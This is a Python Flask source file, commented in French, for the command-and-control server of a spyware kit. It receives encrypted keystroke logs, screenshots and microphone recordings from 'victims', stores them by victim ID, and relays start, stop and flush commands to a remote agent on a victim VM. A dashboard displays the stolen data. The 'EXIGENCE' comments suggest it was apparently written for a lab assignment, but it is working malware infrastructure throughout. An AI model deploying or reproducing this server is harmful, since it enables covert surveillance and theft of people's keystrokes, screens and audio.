from flask import Flask, request, render_template_string, send_from_directory
import os, json, requests
from cryptography.fernet import Fernet

app = Flask(__name__)
# Doit être identique à la clé de la victime
KEY = b'i90Tr_XvY8AUVqb65FHykY7LYCuX3WAouN-5eNju9EE='
cipher = Fernet(KEY)
STORAGE = "./victims" # Dossier pour stocker les logs structurés
VICTIM_IP = "192.168.10.1" # IP de la VM Victime

@app.route('/exfiltrate', methods=['POST'])
def receive_logs():
    """ Reçoit et déchiffre les logs clavier """
    raw_data = cipher.decrypt(request.form.get('payload').encode()).decode()
    js = json.loads(raw_data)
    # EXIGENCE : Organisation par dossiers UUID
    path = os.path.join(STORAGE, js['id'])
    if not os.path.exists(path): os.makedirs(path)
    with open(f"{path}/log.txt", "a") as f:
        f.write(js['content'])
    return "OK"

@app.route('/upload_media', methods=['POST'])
def receive_media():
    """ Reçoit les fichiers images et audios """
    v_id, m_type = request.form.get('id'), request.form.get('type')
    file = request.files['file']
    path = os.path.join(STORAGE, v_id, m_type)
    if not os.path.exists(path): os.makedirs(path)
    file.save(os.path.join(path, file.filename))
    return "OK"

@app.route('/')
def dashboard():
    """ EXIGENCE : Contrôleur Web avec liste des victimes et statut """
    victims = os.listdir(STORAGE) if os.path.exists(STORAGE) else []
    status = "OFFLINE"
    try:
        # Interrogation du statut réel de l'agent distant
        status = requests.get(f"http://{VICTIM_IP}:8080/status", timeout=1).text
    except: pass
    
    return render_template_string('''
    <body style="background:#0a0a0a; color:#00ff41; font-family:monospace; padding:30px;">
        <h1>COMMAND & CONTROL DASHBOARD</h1>
        <div style="border:1px solid #00ff41; padding:20px; border-radius:10px;">
            <p>ÉTAT DE L'AGENT DISTANT: <b style="color:{{ 'lime' if status=='ACTIVE' else 'red' }}">{{ status }}</b></p>
            <button onclick="location.href='/remote/start'">DÉMARRER CAPTURES</button>
            <button onclick="location.href='/remote/stop'">STOPPER CAPTURES</button>
            <button onclick="location.href='/remote/flush'">VIDER BUFFER</button>
        </div>
        <h3>Victimes Détectées :</h3>
        {% for v in victims %}
            <div style="margin-bottom:10px;">
                ID: {{ v }} | <a href="/view/{{v}}" style="color:white;">Consulter les fichiers exfiltrés</a>
            </div>
        {% endfor %}
    </body>
    ''', victims=victims, status=status)

@app.route('/remote/<cmd>')
def remote_cmd(cmd):
    """ Relais les commandes vers la VM Victime """
    try: requests.get(f"http://{VICTIM_IP}:8080/cmd/{cmd}")
    except: pass
    return '<script>window.location.href="/";</script>'

@app.route('/view/<v_id>')
def view_victim(v_id):
    """ EXIGENCE : Affichage des logs en temps réel (Streaming/Rafraîchissement) """
    path = os.path.join(STORAGE, v_id)
    logs = open(f"{path}/log.txt").read() if os.path.exists(f"{path}/log.txt") else ""
    images = os.listdir(f"{path}/snap") if os.path.exists(f"{path}/snap") else []
    audios = os.listdir(f"{path}/mic") if os.path.exists(f"{path}/mic") else []
    
    return render_template_string('''
        <body style="background:#000; color:#0f0; padding:20px; font-family:monospace;">
            <a href="/" style="color:white;"><- Retour au Dashboard</a>
            <h3>TEXTE CAPTURÉ (KEYLOG)</h3>
            <pre style="background:#111; padding:15px; border:1px solid #333;">{{logs}}</pre>
            <h3>CAPTURES D'ÉCRAN (CONTINU)</h3>
            {% for img in images %}
                <img src="/download/{{v_id}}/snap/{{img}}" width="350" style="margin:5px; border:1px solid #0f0;">
            {% endfor %}
            <h3>ENREGISTREMENTS MICRO (SEGMENTS)</h3>
            {% for aud in audios %}
                <audio controls src="/download/{{v_id}}/mic/{{aud}}" style="display:block; margin-bottom:10px;"></audio>
            {% endfor %}
        </body>
    ''', v_id=v_id, logs=logs, images=images, audios=audios)

@app.route('/download/<path:filename>')
def serve_static(filename):
    return send_from_directory(STORAGE, filename)

if __name__ == "__main__":
    if not os.path.exists(STORAGE): os.makedirs(STORAGE)
    app.run(host='0.0.0.0', port=5000)
